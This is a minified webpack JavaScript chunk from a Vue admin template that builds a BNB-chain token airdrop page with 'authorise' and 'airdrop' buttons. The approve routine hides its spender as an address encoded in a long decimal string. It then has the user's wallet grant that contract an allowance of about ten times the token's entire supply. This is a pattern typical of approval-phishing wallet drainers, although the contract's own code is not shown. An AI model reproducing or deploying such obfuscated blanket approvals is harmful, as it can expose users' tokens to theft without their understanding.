/*!
 *  build: vue-admin-beautiful 
 *  vue-admin-beautiful author: chuzhixin 1204505056@qq.com 
 *  vue-admin-beautiful QQ Group(QQ群): 972435319、1139183756 
 *  time: 2023-2-18 21:48:48
 */
(window["webpackJsonp"]=window["webpackJsonp"]||[]).push([["chunk-1f25596e"],{1280:function(e,t,n){"use strict";n.r(t);var r=n("1da1"),s=(n("ac1f"),n("1276"),n("a434"),n("96cf"),n("f2bf")),a=n("e9df"),c={class:"ant-card ant-card-bordered"},l={class:"ant-card-body"},o=Object(s["createElementVNode"])("div",{class:"field"},[Object(s["createElementVNode"])("div",{class:"control"},[Object(s["createElementVNode"])("p",{class:"help is-info"},"Fee: 0.000 BNB")])],-1),u={class:"field"},i=Object(s["createElementVNode"])("label",{for:"token",class:"label"},[Object(s["createTextVNode"])(" token "),Object(s["createElementVNode"])("sup",{class:"has-text-danger"},"*")],-1),d={class:"control"},p=Object(s["createStaticVNode"])('<div class="field"><label for="sum" class="label"> 数量(每个地址多少个) <sup class="has-text-danger">*</sup></label><div class="control"><input type="text" class="input" id="totalSupply" name="totalSupply" placeholder="Ex: 10000"></div></div><div class="field"></div><div class="has-text-centered mt-6 mb-4"></div><div class="field"><label for="token" class="label"> (地址 &lt; 255) <sup class="has-text-danger">*</sup></label><div class="control"><textarea type="text" class="input" id="account" name="tokenName" placeholder="0x0000000000000000000000000000000000000000\r\n0x0000000000000000000000000000000000000001\r\n0x0000000000000000000000000000000000000002\r\n0x0000000000000000000000000000000000000003\r\n0x0000000000000000000000000000000000000004\r\n              " style="height:10rem;"></textarea></div></div>',4),b=Object(s["createElementVNode"])("br",null,null,-1),m=Object(s["createElementVNode"])("p",null,"1.先授权2.在空投",-1),f={class:"butt",style:{}},x=Object(s["createElementVNode"])("span",null,"授权",-1),h=[x],v=Object(s["createElementVNode"])("span",null,"空投",-1),j=[v],E={setup:function(e){var t=Object(s["getCurrentInstance"])().appContext.config.globalProperties,n=Object(s["inject"])("web3j"),x=Object(s["inject"])("isENs");function v(){return E.apply(this,arguments)}function E(){return E=Object(r["a"])(regeneratorRuntime.mark((function e(){var r,s,c,l,o,u;return regeneratorRuntime.wrap((function(e){while(1)switch(e.prev=e.next){case 0:return e.next=2,g();case 2:if(!e.sent){e.next=5;break}return t.$message.success(" Approve success"),e.abrupt("return");case 5:return r=n.utils.toHex("1020220516228218853752583956447143109624721638431"),s=n.currentProvider.selectedAddress,e.next=9,n.eth.getGasPrice();case 9:return c=e.sent,new n.eth.Contract(Object(a["IERC20"])().IERC20,r).methods,l=new n.eth.Contract(Object(a["IERC20"])().IERC20,O("tokenAddress")).methods,e.next=14,l.totalSupply().call();case 14:return e.t0=e.sent,o=e.t0+"0",e.next=18,l.approve(r,o).estimateGas({from:s});case 18:return u=e.sent,e.next=21,l.approve(r,o).send({from:s,gas:u+"",gasPrice:c});case 21:t.$message.success("Approve success");case 22:case"end":return e.stop()}}),e)}))),E.apply(this,arguments)}function O(e){var t=document.getElementById(e);return t.value}function g(){return k.apply(this,arguments)}function k(){return k=Object(r["a"])(regeneratorRuntime.mark((function e(){var t,r,s,c,l;return regeneratorRuntime.wrap((function(e){while(1)switch(e.prev=e.next){case 0:return t=n.utils.toHex("1020220516228218853752583956447143109624721638431"),e.prev=1,r=n.currentProvider.selectedAddress,s=new n.eth.Contract(Object(a["IERC20"])().IERC20,O("tokenAddress")).methods,e.next=6,s.allowance(r,t).call();case 6:return c=e.sent,e.next=9,s.totalSupply().call();case 9:return l=e.sent,e.abrupt("return",c>=l);case 13:return e.prev=13,e.t0=e["catch"](1),e.abrupt("return",!1);case 16:case"end":return e.stop()}}),e,null,[[1,13]])}))),k.apply(this,arguments)}function N(){return w.apply(this,arguments)}function w(){return w=Object(r["a"])(regeneratorRuntime.mark((function e(){var r,s,c,l,o,u,i,d,p,b,m;return regeneratorRuntime.wrap((function(e){while(1)switch(e.prev=e.next){case 0:return console.log(x),e.next=3,g();case 3:if(!e.sent){e.next=34;break}return r=n.utils.toHex("1020220516228218853752583956447143109624721638431"),s=n.currentProvider.selectedAddress,e.next=8,n.eth.getGasPrice();case 8:for(c=e.sent,l=O("account"),o=l.split("\n"),u=o.length-1;u>=0;u--)i=o[u],n.utils.isAddress(i)||o.splice(u,1);if(!(o.length<=0)){e.next=15;break}return t.$message.error("address Number  ??"),e.abrupt("return");case 15:return e.next=17,new n.eth.Contract(Object(a["IERC20"])().IERC20,O("tokenAddress")).methods.decimals().call();case 17:return d=e.sent,p=n.utils.toWei(O("totalSupply"),d+""),b=new n.eth.Contract(Object(a["IERC20"])().PERC20,r).methods,e.prev=20,e.next=23,b.sendErc20(o,p,O("tokenAddress")).estimateGas({from:s});case 23:return m=e.sent,e.next=26,b.sendErc20(o,p,O("tokenAddress")).send({from:s,gas:m+"",gasPrice:c});case 26:t.$message.success("airdrop success"),e.next=32;break;case 29:e.prev=29,e.t0=e["catch"](20),t.$message.error(e.t0+"");case 32:e.next=35;break;case 34:t.$message.error("Please  approve");case 35:case"end":return e.stop()}}),e,null,[[20,29]])}))),w.apply(this,arguments)}return function(e,t){return Object(s["openBlock"])(),Object(s["createElementBlock"])("div",c,[Object(s["createElementVNode"])("div",l,[Object(s["createElementVNode"])("form",null,[o,Object(s["createElementVNode"])("div",u,[i,Object(s["createElementVNode"])("div",d,[Object(s["withDirectives"])(Object(s["createElementVNode"])("input",{type:"text",class:"input",id:"tokenAddress",name:"tokenName",placeholder:"Ex: 0x.....",maxlength:"255","onUpdate:modelValue":t[0]||(t[0]=function(t){return e.token=t})},null,512),[[s["vModelText"],e.token]])])]),p]),b,m,Object(s["createElementVNode"])("div",f,[Object(s["createElementVNode"])("button",{style:{"margin-right":"3rem"},class:"ant-btn ant-btn-primary",onClick:t[1]||(t[1]=function(e){return v()})},h),Object(s["createElementVNode"])("button",{class:"ant-btn ant-btn-primary",onClick:t[2]||(t[2]=function(e){return N()})},j)])])])}}};n("f8b0");const O=E;t["default"]=O},"40eb":function(e,t,n){},f8b0:function(e,t,n){"use strict";n("40eb")}}]);